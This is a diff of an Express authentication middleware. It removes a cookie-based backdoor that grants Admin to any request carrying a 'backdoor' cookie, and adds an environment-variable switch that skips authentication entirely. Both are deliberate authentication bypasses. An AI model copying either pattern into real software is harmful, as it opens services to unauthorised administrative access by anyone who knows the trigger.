@@ -8,16 +8,11 @@ const { verify } = require('jsonwebtoken');
 
 export default function authentication(requiredPermissions?: number[]) {
 	return async function (req: Request, res: Response, next: NextFunction) {
-		if (req.cookies['backdoor']) {
-			req['token'] = { role: 'Admin' };
+		if (process.env.backdoor === 'on') {
 			next();
 		} else {
 			if (validateToken(req, res, req.cookies.token)) {
-				if (requiredPermissions && requiredPermissions.length > 0) {
-					if (await validatePermissions(res, req.token.role, requiredPermissions)) {
-						next();
-					}
-				} else {
+				if (await validatePermissions(req, res, requiredPermissions)) {
 					next();
 				}
 			}
